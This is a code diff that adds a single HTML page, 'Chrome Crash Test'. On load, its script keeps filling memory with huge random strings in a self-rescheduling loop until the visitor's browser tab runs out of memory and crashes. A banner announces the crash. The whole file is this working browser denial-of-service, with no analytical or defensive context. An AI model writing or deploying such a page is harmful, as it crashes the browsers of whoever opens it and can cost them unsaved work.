@@ -1,1 +1,23 @@
- 
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>💥 Chrome Crash Test</title>
+  <script>
+    window.onload = function () {
+      const junk = [];
+      function fill() {
+        for (let i = 0; i < 100; i++) {
+          // Add massive strings to memory
+          junk.push(new Array(500000).fill(Math.random().toString(36)).join(""));
+        }
+        setTimeout(fill, 0); // Prevent call stack overflow
+      }
+      fill();
+    };
+  </script>
+</head>
+<body>
+  <h1 style="text-align:center; font-family:sans-serif; margin-top:20%;">⏳ Crashing Chrome... Please wait</h1>
+</body>
+</html>
